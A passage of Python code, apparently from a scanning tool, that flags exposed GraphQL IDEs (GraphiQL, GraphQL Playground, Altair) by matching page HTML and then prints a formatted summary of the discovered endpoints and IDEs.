                if 'graphiql' in html or 'graphql playground' in html or 'altair' in html:
                    discovered_ides.append(url)
                    output.append(f"  [+] FOUND IDE: {url} (HTTP 200)")
        except Exception:
            pass
            
    output.append("\n═══════════════════════════════════════════════════════════")
    output.append("                      SUMMARY")
    output.append("═══════════════════════════════════════════════════════════")
    
    if discovered_endpoints:
        output.append(f"\n✅ Discovered {len(discovered_endpoints)} GraphQL Endpoints:")
        for e in discovered_endpoints:
            output.append(f"  • {e}")
    else:
        output.append("\n❌ No GraphQL endpoints discovered.")
        
    if discovered_ides:
        output.append(f"\n✅ Discovered {len(discovered_ides)} GraphQL IDEs:")
        for i in discovered_ides:
            output.append(f"  • {i}")
            
    return "\n".join(output)
